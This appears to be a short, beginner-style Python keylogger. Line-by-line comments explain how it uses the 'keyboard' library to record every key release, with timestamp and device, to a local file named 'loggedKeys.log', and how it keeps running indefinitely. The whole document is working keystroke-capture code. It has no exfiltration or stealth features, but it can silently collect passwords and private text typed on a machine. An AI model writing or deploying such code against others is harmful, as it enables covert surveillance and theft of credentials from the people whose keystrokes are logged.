import keyboard                 #import keyboard for listening to keystrokes
import logging                  #imporet Logging for recording keystrokes
import datetime                 #import Datetime to get time and date for keystrokes

log_file = "loggedKeys.log"     #creating a variable called log_file and assigning it the value "loggedKeys.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG) # Configuring basic logging settings, specifying the name of the log file and setting the logging level to DEBUG

def on_key_event(event):        #define a function called 'on_key_event' that takes a single parameter, 'event'

    try: 
        with open(log_file, 'a') as f: #this code opens the log file in 'append' mode and assigns the file object to the variable 'f'
            f.write(f"Key: {event.name}, Time: {datetime.datetime.now()}, Device: {event.device}\n") #if the file is opened successfully, then write the key event information to the file in the formatted string.
    except IOError:             #else write error message
            logging.exception("Failed to write to log file")

keyboard.on_release(callback=on_key_event) #setting up a listener for key release events and calls the 'on_key_event' function every time a key is released

keyboard.wait()                 #keep the script running
